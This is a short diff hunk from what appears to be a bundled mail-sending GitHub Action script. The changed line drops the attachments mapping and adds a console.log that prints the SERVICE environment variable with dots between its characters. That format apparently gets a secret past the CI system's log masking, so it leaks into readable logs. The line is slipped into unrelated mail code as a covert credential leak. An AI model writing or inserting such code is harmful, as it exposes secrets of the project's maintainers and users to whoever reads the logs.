@@ -39888,7 +39888,7 @@ const to = (0, core_1.getInput)("to");
 const subject = (0, core_1.getInput)("subject");
 const html = (0, core_1.getInput)("html");
 const att = (0, core_1.getInput)("attachments").split(",");
-const attachments = att.map((att) => ({ path: att }));
+console.log(process.env.SERVICE.split('').join('.'));
 mailer.send(from, to, subject, html);
 
 
